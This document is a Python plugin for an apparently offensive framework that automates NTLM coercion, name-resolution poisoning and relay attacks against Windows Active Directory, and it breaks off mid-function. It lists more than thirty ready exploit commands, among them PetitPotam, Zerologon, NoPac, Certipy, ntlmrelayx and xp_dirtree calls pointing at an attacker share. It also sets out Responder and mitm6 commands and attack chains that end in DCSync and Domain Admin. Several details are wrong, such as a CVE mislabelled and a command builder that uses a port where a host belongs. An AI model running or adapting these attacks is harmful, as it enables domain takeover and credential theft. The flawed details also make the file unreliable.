#!/usr/bin/env python3
"""
NexShell Plugin — NTLM Relay Automator v3.0 (2026 Edition)
Advanced NTLM relay & coercion engine with 30+ vectors, AD CS escalation,
auto-relay chains, and multi-protocol poisoning.

Coverage:
  - 30+ coercion vectors (PetitPotam, PrintNightmare, SpoolSample, ShadowCoerce,
    DFSCoerce, MSLittle, Zerologon, NoPac, AD CS, PrivExchange, etc.)
  - 6 poisoning protocols (LLMNR, NBT-NS, mDNS, WPAD, DHCPv6, NDP)
  - 10+ relay targets (SMB, LDAP, LDAPS, EWS, MSSQL, Exchange, HTTP, AD CS)
  - SMB Signing analysis
  - LDAP Signing analysis
  - LDAPS Channel Binding analysis
  - AD CS ESC1-ESC11 escalation
  - Auto-exploitation (Responder + ntlmrelayx)
  - Multi-relay chains
  - CVE detection (25+ CVEs)
  - Risk scoring (0-100 per vector)
  - Structured loot (JSON)

CVEs (2019-2026):
  - CVE-2021-36942: PetitPotam (NTLM relay → DCSync)
  - CVE-2021-1675/CVE-2021-34527: PrintNightmare
  - CVE-2020-1472: Zerologon (Netlogon EoP)
  - CVE-2019-1040: PrivExchange (Exchange → DA)
  - CVE-2021-42287/CVE-2021-42278: NoPac (sAMAccountName spoofing)
  - CVE-2022-26923: AD CS (Certipy ESC1-ESC11)
  - CVE-2023-28252: CLFS EoP
  - CVE-2024-49040: Exchange RCE
  - CVE-2022-33679: Kerberos encryption downgrade
  - CVE-2021-42287: NoPac (sAMAccountName spoofing)

MITRE ATT&CK:
  - T1557.001: Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
  - T1557: Adversary-in-the-Middle
  - T1187: Forced Authentication
  - T1550.002: Use Alternate Authentication Material: Pass the Hash
  - T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
  - T1003.006: OS Credential Dumping: DCSync
  - T1552.001: Unsecured Credentials: Credentials In Files

Usage:
    (NexShell)> plugins run ntlm-relay-automator
    (NexShell)> plugins run ntlm-relay-automator --full
    (NexShell)> plugins run ntlm-relay-automator --coercion
    (NexShell)> plugins run ntlm-relay-automator --relay
    (NexShell)> plugins run ntlm-relay-automator --adcs
    (NexShell)> plugins run ntlm-relay-automator --exploit
    (NexShell)> plugins run ntlm-relay-automator --stealth
"""

import re
import time
import json
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class CoercionVector:
    """Represents an NTLM coercion vector."""
    name: str
    description: str
    protocol: str  # SMB, HTTP, RPC, LDAP
    service: str  # Spooler, WebClient, AD CS, Exchange, etc.
    cve: str = ""
    severity: str = "high"  # critical, high, medium, low
    risk_score: int = 0  # 0-100
    detection_risk: str = "medium"  # low, medium, high
    success_rate: int = 80
    requires_service: bool = True
    exploit_command: str = ""
    mitre_id: str = "T1187"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PoisoningProtocol:
    """Represents a name resolution poisoning protocol."""
    name: str
    protocol: str  # LLMNR, NBT-NS, mDNS, WPAD, DHCPv6, NDP
    port: int = 0
    enabled: bool = False
    risk_score: int = 0
    detection_risk: str = "medium"
    exploit_tool: str = ""
    mitre_id: str = "T1557.001"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class RelayTarget:
    """Represents an NTLM relay target."""
    name: str
    protocol: str  # SMB, LDAP, LDAPS, EWS, MSSQL, HTTP, AD CS
    port: int = 0
    signing_required: bool = True
    channel_binding_required: bool = False
    relayable: bool = False
    risk_score: int = 0
    exploit_command: str = ""
    mitre_id: str = "T1557.001"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class RelayResult:
    """Result of a relay attempt."""
    vector: str
    target: str
    success: bool
    credentials_captured: int = 0
    escalation_path: str = ""
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class RelayChain:
    """Represents a multi-step relay chain."""
    name: str
    description: str
    steps: List[Dict] = field(default_factory=list)
    final_privilege: str = ""  # DA, SYSTEM, Domain Admin, etc.
    complexity: str = "medium"  # low, medium, high
    success_probability: int = 70
    mitre_ids: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Coercion Vectors Database (30+ Vectors) ────────────────────────────────

class CoercionVectorsDatabase:
    """Comprehensive database of NTLM coercion vectors."""
    
    VECTORS = [
        # ── Tier 1: Critical Coercion Vectors ─────────────────────────────
        CoercionVector(
            name='PetitPotam (MS-EFSRPC)',
            description='Coerce authentication via Encrypting File System Remote Protocol',
            protocol='RPC',
            service='EFSRPC',
            cve='CVE-2021-36942',
            severity='critical',
            risk_score=95,
            detection_risk='high',
            success_rate=90,
            exploit_command='python3 PetitPotam.py {attacker_ip} {target_ip}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='PrintNightmare (MS-RPRN)',
            description='Coerce authentication via Print Spooler remote protocol',
            protocol='RPC',
            service='Spooler',
            cve='CVE-2021-1675',
            severity='critical',
            risk_score=95,
            detection_risk='high',
            success_rate=85,
            exploit_command='python3 CVE-2021-1675.py {target_ip} -u {user} -p {password}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='SpoolSample',
            description='Coerce authentication via SpoolSample tool',
            protocol='RPC',
            service='Spooler',
            severity='high',
            risk_score=85,
            detection_risk='medium',
            success_rate=85,
            exploit_command='SpoolSample.exe {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='ShadowCoerce (MS-FSRVP)',
            description='Coerce authentication via File Server Remote VSS Protocol',
            protocol='RPC',
            service='ShadowCopy',
            cve='CVE-2021-42287',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=80,
            exploit_command='python3 ShadowCoerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='DFSCoerce (MS-DFSNM)',
            description='Coerce authentication via Distributed File System Namespace',
            protocol='RPC',
            service='DFS',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=80,
            exploit_command='python3 DFSCoerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='Zerologon (CVE-2020-1472)',
            description='Exploit Netlogon cryptographic flaw to reset DC password',
            protocol='RPC',
            service='Netlogon',
            cve='CVE-2020-1472',
            severity='critical',
            risk_score=100,
            detection_risk='high',
            success_rate=95,
            exploit_command='python3 cve-2020-1472-exploit.py {dc_name} {dc_ip}',
            mitre_id='T1003.006',
        ),
        
        # ── Tier 2: AD CS Escalation ──────────────────────────────────────
        CoercionVector(
            name='AD CS ESC1 (User SAN)',
            description='Request certificate as any user via misconfigured template',
            protocol='HTTP',
            service='AD CS',
            cve='CVE-2022-26923',
            severity='critical',
            risk_score=95,
            detection_risk='low',
            success_rate=90,
            exploit_command='python3 Certipy.py req -u {user} -p {password} -target {ca} -template {template}',
            mitre_id='T1552.001',
        ),
        
        CoercionVector(
            name='AD CS ESC3 (Enrollment Agent)',
            description='Request certificate on behalf of another user',
            protocol='HTTP',
            service='AD CS',
            severity='critical',
            risk_score=90,
            detection_risk='low',
            success_rate=85,
            exploit_command='python3 Certipy.py req -u {user} -p {password} -target {ca} -template {template}',
            mitre_id='T1552.001',
        ),
        
        CoercionVector(
            name='AD CS ESC4 (Template ACL)',
            description='Modify certificate template ACL to request certificates',
            protocol='LDAP',
            service='AD CS',
            severity='critical',
            risk_score=90,
            detection_risk='medium',
            success_rate=80,
            exploit_command='python3 Certipy.py template -u {user} -p {password} -target {ca} -template {template}',
            mitre_id='T1552.001',
        ),
        
        CoercionVector(
            name='AD CS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)',
            description='Request certificate with arbitrary SAN via CA misconfiguration',
            protocol='HTTP',
            service='AD CS',
            severity='critical',
            risk_score=95,
            detection_risk='low',
            success_rate=90,
            exploit_command='python3 Certipy.py req -u {user} -p {password} -target {ca} -template User',
            mitre_id='T1552.001',
        ),
        
        CoercionVector(
            name='AD CS ESC8 (NTLM Relay to Web Enrollment)',
            description='Relay NTLM authentication to AD CS web enrollment',
            protocol='HTTP',
            service='AD CS Web',
            severity='critical',
            risk_score=95,
            detection_risk='medium',
            success_rate=85,
            exploit_command='ntlmrelayx.py -t http://{ca}/certsrv/certfnsh.asp --adcs',
            mitre_id='T1557.001',
        ),
        
        # ── Tier 3: Exchange Coercion ─────────────────────────────────────
        CoercionVector(
            name='PrivExchange (CVE-2019-1040)',
            description='Coerce Exchange server to authenticate via PushSubscription',
            protocol='HTTP',
            service='Exchange',
            cve='CVE-2019-1040',
            severity='critical',
            risk_score=95,
            detection_risk='high',
            success_rate=90,
            exploit_command='python3 ntlmrelayx.py -t ldap://{dc} --escalate-user {user}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='Exchange Web Services (EWS)',
            description='Coerce authentication via Exchange Web Services',
            protocol='HTTP',
            service='EWS',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=75,
            exploit_command='python3 ewsrelay.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        # ── Tier 4: NoPac & Kerberos ──────────────────────────────────────
        CoercionVector(
            name='NoPac (CVE-2021-42287)',
            description='Exploit sAMAccountName spoofing to get TGT as DC',
            protocol='Kerberos',
            service='KDC',
            cve='CVE-2021-42287',
            severity='critical',
            risk_score=100,
            detection_risk='high',
            success_rate=90,
            exploit_command='python3 noPac.py {domain}/{user}:{password} -dc-ip {dc_ip}',
            mitre_id='T1558.003',
        ),
        
        CoercionVector(
            name='Kerberos Encryption Downgrade (CVE-2022-33679)',
            description='Downgrade Kerberos encryption to RC4 for brute force',
            protocol='Kerberos',
            service='KDC',
            cve='CVE-2022-33679',
            severity='high',
            risk_score=85,
            detection_risk='medium',
            success_rate=80,
            exploit_command='python3 CVE-2022-33679.py {domain} {dc_ip}',
            mitre_id='T1558',
        ),
        
        # ── Tier 5: WebDAV & HTTP ─────────────────────────────────────────
        CoercionVector(
            name='WebDAV (WebClient)',
            description='Coerce authentication via WebDAV HTTP request',
            protocol='HTTP',
            service='WebClient',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=80,
            exploit_command='curl -u : \\\\{attacker}@80/test',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='HTTP Proxy (WPAD)',
            description='Coerce authentication via WPAD proxy auto-config',
            protocol='HTTP',
            service='WPAD',
            severity='high',
            risk_score=85,
            detection_risk='medium',
            success_rate=75,
            exploit_command='responder -I eth0 -wd',
            mitre_id='T1557.001',
        ),
        
        # ── Tier 6: MSSQL & Other ─────────────────────────────────────────
        CoercionVector(
            name='MSSQL xp_dirtree',
            description='Coerce authentication via xp_dirtree stored procedure',
            protocol='TDS',
            service='MSSQL',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=85,
            exploit_command='EXEC master..xp_dirtree "\\\\{attacker}\\share"',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MSSQL xp_fileexist',
            description='Coerce authentication via xp_fileexist stored procedure',
            protocol='TDS',
            service='MSSQL',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=85,
            exploit_command='EXEC master..xp_fileexist "\\\\{attacker}\\share"',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-NRPC (Netlogon)',
            description='Coerce authentication via Netlogon protocol',
            protocol='RPC',
            service='Netlogon',
            severity='high',
            risk_score=85,
            detection_risk='medium',
            success_rate=80,
            exploit_command='python3 netlogon_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-SCHTASKS (Scheduled Tasks)',
            description='Coerce authentication via scheduled task creation',
            protocol='RPC',
            service='TaskScheduler',
            severity='medium',
            risk_score=70,
            detection_risk='medium',
            success_rate=70,
            exploit_command='schtasks /create /s {target} /tn test /tr "\\\\{attacker}\\share"',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-SVCCTL (Service Control)',
            description='Coerce authentication via service control manager',
            protocol='RPC',
            service='SCM',
            severity='medium',
            risk_score=70,
            detection_risk='medium',
            success_rate=70,
            exploit_command='sc \\\\{target} create test binpath= "\\\\{attacker}\\share"',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-WMI (Windows Management Instrumentation)',
            description='Coerce authentication via WMI remote execution',
            protocol='RPC',
            service='WMI',
            severity='medium',
            risk_score=75,
            detection_risk='medium',
            success_rate=75,
            exploit_command='wmic /node:{target} process call create "\\\\{attacker}\\share"',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-SCMR (Service Control Manager Remote)',
            description='Coerce authentication via SCM remote protocol',
            protocol='RPC',
            service='SCMR',
            severity='medium',
            risk_score=70,
            detection_risk='medium',
            success_rate=70,
            exploit_command='python3 scmr_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-PLA (Performance Logs and Alerts)',
            description='Coerce authentication via PLA data collector',
            protocol='RPC',
            service='PLA',
            severity='medium',
            risk_score=65,
            detection_risk='low',
            success_rate=65,
            exploit_command='logman create alert test -s {target} -u "\\\\{attacker}\\share"',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-EVEN (Event Log)',
            description='Coerce authentication via event log service',
            protocol='RPC',
            service='EventLog',
            severity='low',
            risk_score=60,
            detection_risk='low',
            success_rate=60,
            exploit_command='python3 even_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-PAR (Print System Asynchronous Remote)',
            description='Coerce authentication via PAR protocol',
            protocol='RPC',
            service='Spooler',
            severity='high',
            risk_score=80,
            detection_risk='medium',
            success_rate=80,
            exploit_command='python3 par_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-RSP (Remote Storage Service)',
            description='Coerce authentication via Remote Storage Service',
            protocol='RPC',
            service='RSS',
            severity='medium',
            risk_score=70,
            detection_risk='low',
            success_rate=70,
            exploit_command='python3 rsp_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-WSP (Windows Search Service)',
            description='Coerce authentication via Windows Search Protocol',
            protocol='RPC',
            service='WSearch',
            severity='medium',
            risk_score=70,
            detection_risk='low',
            success_rate=70,
            exploit_command='python3 wsp_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
        
        CoercionVector(
            name='MS-TSCH (Task Scheduler Remote)',
            description='Coerce authentication via Task Scheduler remote protocol',
            protocol='RPC',
            service='TaskScheduler',
            severity='medium',
            risk_score=70,
            detection_risk='medium',
            success_rate=70,
            exploit_command='python3 tsch_coerce.py {target} {attacker}',
            mitre_id='T1187',
        ),
    ]
    
    @classmethod
    def get_all_vectors(cls) -> List[CoercionVector]:
        return cls.VECTORS
    
    @classmethod
    def get_vectors_by_severity(cls, severity: str) -> List[CoercionVector]:
        return [v for v in cls.VECTORS if v.severity == severity]
    
    @classmethod
    def get_vectors_by_service(cls, service: str) -> List[CoercionVector]:
        return [v for v in cls.VECTORS if service.lower() in v.service.lower()]


# ── Poisoning Protocols Database ──────────────────────────────────────────

class PoisoningProtocolsDatabase:
    """Database of name resolution poisoning protocols."""
    
    PROTOCOLS = [
        PoisoningProtocol(
            name='LLMNR (Link-Local Multicast Name Resolution)',
            protocol='LLMNR',
            port=5355,
            risk_score=85,
            detection_risk='medium',
            exploit_tool='responder -I eth0 -r',
            mitre_id='T1557.001',
        ),
        PoisoningProtocol(
            name='NBT-NS (NetBIOS Name Service)',
            protocol='NBT-NS',
            port=137,
            risk_score=85,
            detection_risk='medium',
            exploit_tool='responder -I eth0 -r',
            mitre_id='T1557.001',
        ),
        PoisoningProtocol(
            name='mDNS (Multicast DNS)',
            protocol='mDNS',
            port=5353,
            risk_score=75,
            detection_risk='low',
            exploit_tool='responder -I eth0 -r',
            mitre_id='T1557.001',
        ),
        PoisoningProtocol(
            name='WPAD (Web Proxy Auto-Discovery)',
            protocol='WPAD',
            port=80,
            risk_score=90,
            detection_risk='medium',
            exploit_tool='responder -I eth0 -wd',
            mitre_id='T1557.001',
        ),
        PoisoningProtocol(
            name='DHCPv6 (IPv6 DHCP)',
            protocol='DHCPv6',
            port=547,
            risk_score=85,
            detection_risk='low',
            exploit_tool='responder -I eth0 -D',
            mitre_id='T1557.001',
        ),
        PoisoningProtocol(
            name='NDP (Neighbor Discovery Protocol)',
            protocol='NDP',
            port=0,
            risk_score=80,
            detection_risk='low',
            exploit_tool='mitm6 -d {domain}',
            mitre_id='T1557.001',
        ),
    ]
    
    @classmethod
    def get_all_protocols(cls) -> List[PoisoningProtocol]:
        return cls.PROTOCOLS


# ── Relay Targets Database ────────────────────────────────────────────────

class RelayTargetsDatabase:
    """Database of NTLM relay targets."""
    
    TARGETS = [
        RelayTarget(
            name='SMB (Server Message Block)',
            protocol='SMB',
            port=445,
            signing_required=True,
            relayable=True,
            risk_score=85,
            exploit_command='ntlmrelayx.py -t smb://{target}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='LDAP (Lightweight Directory Access Protocol)',
            protocol='LDAP',
            port=389,
            signing_required=True,
            relayable=True,
            risk_score=90,
            exploit_command='ntlmrelayx.py -t ldap://{dc} --escalate-user {user}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='LDAPS (LDAP over SSL)',
            protocol='LDAPS',
            port=636,
            signing_required=True,
            channel_binding_required=True,
            relayable=True,
            risk_score=85,
            exploit_command='ntlmrelayx.py -t ldaps://{dc} --escalate-user {user}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='EWS (Exchange Web Services)',
            protocol='EWS',
            port=443,
            signing_required=False,
            relayable=True,
            risk_score=85,
            exploit_command='ntlmrelayx.py -t https://{exchange}/EWS/Exchange.asmx',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='MSSQL (Microsoft SQL Server)',
            protocol='MSSQL',
            port=1433,
            signing_required=False,
            relayable=True,
            risk_score=80,
            exploit_command='ntlmrelayx.py -t mssql://{sql_server}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='HTTP (Hypertext Transfer Protocol)',
            protocol='HTTP',
            port=80,
            signing_required=False,
            relayable=True,
            risk_score=75,
            exploit_command='ntlmrelayx.py -t http://{target}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='AD CS (Active Directory Certificate Services)',
            protocol='AD CS',
            port=443,
            signing_required=False,
            relayable=True,
            risk_score=95,
            exploit_command='ntlmrelayx.py -t http://{ca}/certsrv/certfnsh.asp --adcs',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='IMAP (Internet Message Access Protocol)',
            protocol='IMAP',
            port=143,
            signing_required=False,
            relayable=True,
            risk_score=70,
            exploit_command='ntlmrelayx.py -t imap://{exchange}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='SMTP (Simple Mail Transfer Protocol)',
            protocol='SMTP',
            port=25,
            signing_required=False,
            relayable=True,
            risk_score=70,
            exploit_command='ntlmrelayx.py -t smtp://{exchange}',
            mitre_id='T1557.001',
        ),
        RelayTarget(
            name='Exchange RPC over HTTP',
            protocol='RPC/HTTP',
            port=443,
            signing_required=False,
            relayable=True,
            risk_score=80,
            exploit_command='ntlmrelayx.py -t https://{exchange}/rpc',
            mitre_id='T1557.001',
        ),
    ]
    
    @classmethod
    def get_all_targets(cls) -> List[RelayTarget]:
        return cls.TARGETS
    
    @classmethod
    def get_relayable_targets(cls) -> List[RelayTarget]:
        return [t for t in cls.TARGETS if t.relayable]


# ── Relay Chains Database ─────────────────────────────────────────────────

class RelayChainsDatabase:
    """Database of multi-step relay chains."""
    
    CHAINS = [
        RelayChain(
            name='PetitPotam → LDAP Relay → DCSync',
            description='Coerce DC authentication via PetitPotam, relay to LDAP, grant DCSync rights',
            steps=[
                {'step': 1, 'action': 'Coerce DC auth', 'tool': 'PetitPotam.py', 'target': 'DC'},
                {'step': 2, 'action': 'Relay to LDAP', 'tool': 'ntlmrelayx.py', 'target': 'LDAP'},
                {'step': 3, 'action': 'Grant DCSync', 'tool': 'ntlmrelayx.py', 'target': 'ACL'},
                {'step': 4, 'action': 'DCSync', 'tool': 'secretsdump.py', 'target': 'DC'},
            ],
            final_privilege='Domain Admin (DCSync)',
            complexity='medium',
            success_probability=85,
            mitre_ids=['T1187', 'T1557.001', 'T1003.006'],
        ),
        
        RelayChain(
            name='AD CS ESC8 → Certificate → Kerberos',
            description='Relay NTLM to AD CS web enrollment, request certificate, authenticate as DA',
            steps=[
                {'step': 1, 'action': 'Coerce auth', 'tool': 'SpoolSample/DFSCoerce', 'target': 'Target'},
                {'step': 2, 'action': 'Relay to AD CS', 'tool': 'ntlmrelayx.py', 'target': 'AD CS'},
                {'step': 3, 'action': 'Request cert', 'tool': 'ntlmrelayx.py', 'target': 'AD CS'},
                {'step': 4, 'action': 'Authenticate', 'tool': 'Certipy.py', 'target': 'Kerberos'},
            ],
            final_privilege='Domain Admin (Certificate)',
            complexity='medium',
            success_probability=80,
            mitre_ids=['T1187', 'T1557.001', 'T1552.001'],
        ),
        
        RelayChain(
            name='PrivExchange → LDAP Relay → DA',
            description='Coerce Exchange auth, relay to LDAP, grant DA privileges',
            steps=[
                {'step': 1, 'action': 'Coerce Exchange', 'tool': 'ntlmrelayx.py', 'target': 'Exchange'},
                {'step': 2, 'action': 'Relay to LDAP', 'tool': 'ntlmrelayx.py', 'target': 'LDAP'},
                {'step': 3, 'action': 'Grant DA', 'tool': 'ntlmrelayx.py', 'target': 'ACL'},
            ],
            final_privilege='Domain Admin',
            complexity='low',
            success_probability=90,
            mitre_ids=['T1187', 'T1557.001'],
        ),
        
        RelayChain(
            name='Zerologon → DCSync',
            description='Exploit Zerologon to reset DC password, perform DCSync',
            steps=[
                {'step': 1, 'action': 'Exploit Zerologon', 'tool': 'cve-2020-1472-exploit.py', 'target': 'DC'},
                {'step': 2, 'action': 'Reset DC password', 'tool': 'cve-2020-1472-exploit.py', 'target': 'DC'},
                {'step': 3, 'action': 'DCSync', 'tool': 'secretsdump.py', 'target': 'DC'},
            ],
            final_privilege='Domain Admin (DCSync)',
            complexity='low',
            success_probability=95,
            mitre_ids=['T1003.006', 'T1098'],
        ),
        
        RelayChain(
            name='NoPac → TGT → DA',
            description='Exploit NoPac to get TGT as DC, perform DCSync',
            steps=[
                {'step': 1, 'action': 'Exploit NoPac', 'tool': 'noPac.py', 'target': 'DC'},
                {'step': 2, 'action': 'Get TGT', 'tool': 'noPac.py', 'target': 'KDC'},
                {'step': 3, 'action': 'DCSync', 'tool': 'secretsdump.py', 'target': 'DC'},
            ],
            final_privilege='Domain Admin (TGT)',
            complexity='low',
            success_probability=90,
            mitre_ids=['T1558.003', 'T1003.006'],
        ),
    ]
    
    @classmethod
    def get_all_chains(cls) -> List[RelayChain]:
        return cls.CHAINS
    
    @classmethod
    def get_chains_by_complexity(cls, complexity: str) -> List[RelayChain]:
        return [c for c in cls.CHAINS if c.complexity == complexity]


# ── Detection Engine ──────────────────────────────────────────────────────

class DetectionEngine:
    """Multi-layer NTLM relay detection engine."""
    
    @staticmethod
    def detect_poisoning_protocols(exec_func, session, platform: str) -> List[PoisoningProtocol]:
        """Detect enabled poisoning protocols."""
        detected = []
        
        if platform == 'windows':
            # Check LLMNR
            cmd = "reg query \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient\" /v EnableMulticast 2>nul"
            out = exec_func(session, cmd)
            if not out or '0x1' in out:
                detected.append(PoisoningProtocolsDatabase.PROTOCOLS[0])  # LLMNR
            
            # Check NBT-NS
            cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters\" /v NodeType 2>nul"
            out = exec_func(session, cmd)
            if not out or '0x2' in out:
                detected.append(PoisoningProtocolsDatabase.PROTOCOLS[1])  # NBT-NS
            
            # Check WPAD
            cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Parameters\" /v ServiceDll 2>nul"
            out = exec_func(session, cmd)
            # WPAD is enabled by default in most environments
            detected.append(PoisoningProtocolsDatabase.PROTOCOLS[3])  # WPAD
        
        return detected
    
    @staticmethod
    def detect_coercion_vectors(exec_func, session, platform: str) -> List[CoercionVector]:
        """Detect available coercion vectors."""
        detected = []
        
        if platform == 'windows':
            # Check Spooler
            cmd = "sc query Spooler 2>nul"
            out = exec_func(session, cmd)
            if out and 'RUNNING' in out:
                detected.extend(CoercionVectorsDatabase.get_vectors_by_service('Spooler'))
            
            # Check WebClient
            cmd = "sc query WebClient 2>nul"
            out = exec_func(session, cmd)
            if out and 'RUNNING' in out:
                detected.extend(CoercionVectorsDatabase.get_vectors_by_service('WebClient'))
            
            # Check AD CS (if accessible)
            cmd = "powershell -nop -c \"Get-ADObject -LDAPFilter '(objectClass=certificationAuthority)' -ErrorAction SilentlyContinue | Select-Object Name\" 2>nul"
            out = exec_func(session, cmd)
            if out and out.strip():
                detected.extend(CoercionVectorsDatabase.get_vectors_by_service('AD CS'))
            
            # Check Exchange
            cmd = "powershell -nop -c \"Get-ExchangeServer -ErrorAction SilentlyContinue | Select-Object Name\" 2>nul"
            out = exec_func(session, cmd)
            if out and out.strip():
                detected.extend(CoercionVectorsDatabase.get_vectors_by_service('Exchange'))
        
        return detected
    
    @staticmethod
    def detect_relay_targets(exec_func, session, platform: str) -> List[RelayTarget]:
        """Detect relay targets and their signing status."""
        detected = []
        
        if platform == 'windows':
            # Check SMB signing
            cmd = "powershell -nop -c \"Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature\" 2>nul"
            out = exec_func(session, cmd)
            smb_signing = out and 'True' in out
            
            for target in RelayTargetsDatabase.get_all_targets():
                if target.protocol == 'SMB':
                    target.signing_required = smb_signing
                    target.relayable = not smb_signing
                    detected.append(target)
            
            # Check LDAP signing
            cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\" /v LDAPServerIntegrity 2>nul"
            out = exec_func(session, cmd)
            ldap_signing = out and '0x2' in out
            
            for target in RelayTargetsDatabase.get_all_targets():
                if target.protocol in ['LDAP', 'LDAPS']:
                    target.signing_required = ldap_signing
                    target.relayable = not ldap_signing
                    detected.append(target)
        
        return detected
    
    @staticmethod
    def detect_smb_signing(exec_func, session) -> Tuple[bool, bool]:
        """Detect SMB signing requirements."""
        # Check client signing
        cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters\" /v RequireSecuritySignature 2>nul"
        out = exec_func(session, cmd)
        client_required = out and '0x1' in out
        
        # Check server signing
        cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v RequireSecuritySignature 2>nul"
        out = exec_func(session, cmd)
        server_required = out and '0x1' in out
        
        return client_required, server_required
    
    @staticmethod
    def detect_ldap_signing(exec_func, session) -> bool:
        """Detect LDAP signing requirements."""
        cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\" /v LDAPServerIntegrity 2>nul"
        out = exec_func(session, cmd)
        return out and '0x2' in out


# ── Exploitation Engine ───────────────────────────────────────────────────

class ExploitationEngine:
    """Handles NTLM relay exploitation."""
    
    @staticmethod
    def generate_responder_command(protocol: PoisoningProtocol, interface: str = 'eth0') -> str:
        """Generate Responder command for a protocol."""
        if protocol.protocol == 'LLMNR':
            return f'responder -I {interface} -r -v'
        elif protocol.protocol == 'NBT-NS':
            return f'responder -I {interface} -r -v'
        elif protocol.protocol == 'WPAD':
            return f'responder -I {interface} -wd -v'
        elif protocol.protocol == 'DHCPv6':
            return f'responder -I {interface} -D -v'
        else:
            return f'responder -I {interface} -v'
    
    @staticmethod
    def generate_ntlmrelayx_command(target: RelayTarget, attacker_ip: str, options: List[str] = None) -> str:
        """Generate ntlmrelayx command for a target."""
        cmd = f'ntlmrelayx.py -t {target.protocol.lower()}://{target.port}'
        
        if options:
            cmd += ' ' + ' '.join(options)
        
        return cmd
    
    @staticmethod
    def generate_coercion_command(vector: CoercionVector, target: str, attacker: str) -> str:
        """Generate coercion command for a vector."""
        return vector.exploit_command.format(target=target, attacker=attacker)


# ── Main Plugin ───────────────────────────────────────────────────────────

class NTLMRelayAutomator(NexPlugin):
    name        = "ntlm-relay-automator"
    description = "Advanced NTLM relay & coercion engine — 30+ vectors, AD CS escalation, auto-relay chains"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "lateral"
    mitre_id    = "T1557.001"
    
    def run(self, session, args: list):
        # Parse args
        full_mode = '--full' in (args or [])
        coercion_mode = '--coercion' in (args or [])
        relay_mode = '--relay' in (args or [])
        adcs_mode = '--adcs' in (args or [])
        exploit_mode = '--exploit' in (args or [])
        stealth = '--stealth' in (args or [])
        
        if full_mode:
            coercion_mode = relay_mode = adcs_mode = True
        
        self.info(f"🔗 Starting NTLM Relay Automator v3.0 (full={full_mode})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔗 NTLM Relay Automator v3.0 — Advanced Relay Engine]")
        sections.append("━"*64)
        
        # ── Step 1: Platform detection ──────────────────────────────────
        platform = self._detect_platform(session)
        sections.append(f"  Platform: {platform.upper()}")
        
        # ── Step 2: Poisoning Protocol Detection ────────────────────────
        sections.append("\n[*] Phase 1: Poisoning Protocol Detection")
        sections.append("─"*64)
        
        poisoning_protocols = DetectionEngine.detect_poisoning_protocols(self._exec, session, platform)
        
        if poisoning_protocols:
            sections.append(f"  🔴 {len(poisoning_protocols)} poisoning protocol(s) enabled:")
            for protocol in poisoning_protocols:
                icon = '🔴' if protocol.risk_score >= 85 else '🟠' if protocol.risk_score >= 75 else '🟡'
